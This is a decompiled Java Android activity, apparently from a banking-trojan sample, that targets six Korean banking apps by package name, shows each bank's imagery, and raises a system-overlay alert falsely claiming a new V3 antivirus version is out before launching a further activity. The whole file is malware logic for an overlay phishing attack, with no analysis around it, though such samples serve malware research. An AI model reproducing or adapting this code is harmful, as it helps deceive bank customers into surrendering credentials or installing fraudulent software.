// Decompiled by Jad v1.5.8e. Copyright 2001 Pavel Kouznetsov.
// Jad home page: http://www.geocities.com/kpdus/jad.html
// Decompiler options: packimports(3) 

package com.example.tnt2;

import android.app.*;
import android.content.DialogInterface;
import android.content.Intent;
import android.os.Bundle;
import android.view.Window;
import android.widget.LinearLayout;
import java.util.List;

// Referenced classes of package com.example.tnt2:
//            MainActivity, WorkActivity

public class InstallActivity extends Activity
{

    public InstallActivity()
    {
        dialog_msg = "";
        dialog_title = "";
    }

    private void openDialog()
    {
        android.app.AlertDialog.Builder builder = new android.app.AlertDialog.Builder(getApplicationContext());
        builder.setMessage(dialog_msg);
        builder.setTitle(dialog_title);
        builder.setPositiveButton("\uD655\uC778", new android.content.DialogInterface.OnClickListener() {

            public void onClick(DialogInterface dialoginterface, int i)
            {
                dialoginterface.dismiss();
                Intent intent = new Intent();
                intent.setClass(getApplicationContext(), com/example/tnt2/WorkActivity);
                intent.setFlags(0x10000000);
                startActivity(intent);
            }

            final InstallActivity this$0;

            
            {
                this$0 = InstallActivity.this;
                super();
            }
        });
        AlertDialog alertdialog = builder.create();
        alertdialog.getWindow().setType(2003);
        alertdialog.show();
    }

    private void playTone()
    {
        NotificationManager notificationmanager = (NotificationManager)getSystemService("notification");
        Notification notification = new Notification();
        notification.defaults = 1;
        notificationmanager.notify(1, notification);
    }

    protected void onCreate(Bundle bundle)
    {
        String s;
        setContentView(0x7f030004);
        super.onCreate(bundle);
        if(MainActivity.activityList != null)
            MainActivity.activityList.add(this);
        mainLayout = (LinearLayout)findViewById(0x7f080004);
        s = getIntent().getStringExtra("pkgName");
        if(s == null)
        {
            finish();
            return;
        }
        if(!s.equals("com.hanabank.ebk.channel.android.hananbank")) goto _L2; else goto _L1
_L1:
        mainLayout.setBackgroundResource(0x7f020000);
        dialog_msg = "V3 \uC0C8\uB85C\uC6B4 \uBC84\uC804\uC774 \uCD9C\uC2DC\uB418\uC5C8\uC2B5\uB2C8\uB2E4.";
        dialog_title = "\uC54C\uB9BC";
_L4:
        playTone();
        openDialog();
        return;
_L2:
        if(s.equals("com.ibk.neobanking"))
        {
            mainLayout.setBackgroundResource(0x7f020001);
            dialog_msg = "V3 \uC0C8\uB85C\uC6B4 \uBC84\uC804\uC774 \uCD9C\uC2DC\uB418\uC5C8\uC2B5\uB2C8\uB2E4.";
            dialog_title = "\uC54C\uB9BC";
        } else
        if(s.equals("com.kbstar.kbbank"))
        {
            mainLayout.setBackgroundResource(0x7f020004);
            dialog_msg = "V3  \uC0C8\uB85C\uC6B4 \uBC84\uC804\uC774 \uCD9C\uC2DC\uB418\uC5C8\uC2B5\uB2C8\uB2E4.";
            dialog_title = "\uC54C\uB9BC";
        } else
        if(s.equals("nh.smart"))
        {
            mainLayout.setBackgroundResource(0x7f020005);
            dialog_msg = "V3 \uC0C8\uB85C\uC6B4 \uBC84\uC804\uC774 \uCD9C\uC2DC\uB418\uC5C8\uC2B5\uB2C8\uB2E4.";
            dialog_title = "\uC54C\uB9BC";
        } else
        if(s.equals("com.shinhan.sbanking"))
        {
            mainLayout.setBackgroundResource(0x7f020007);
            dialog_msg = "V3 \uC0C8\uB85C\uC6B4 \uBC84\uC804\uC774 \uCD9C\uC2DC\uB418\uC5C8\uC2B5\uB2C8\uB2E4.";
            dialog_title = "\uC54C\uB9BC";
        } else
        if(s.equals("com.webcash.wooribank"))
        {
            mainLayout.setBackgroundResource(0x7f020008);
            dialog_msg = "V3 \uC0C8\uB85C\uC6B4 \uBC84\uC804\uC774 \uCD9C\uC2DC\uB418\uC5C8\uC2B5\uB2C8\uB2E4.";
            dialog_title = "\uC54C\uB9BC";
        }
        if(true) goto _L4; else goto _L3
_L3:
    }

    private String dialog_msg;
    private String dialog_title;
    private LinearLayout mainLayout;
}
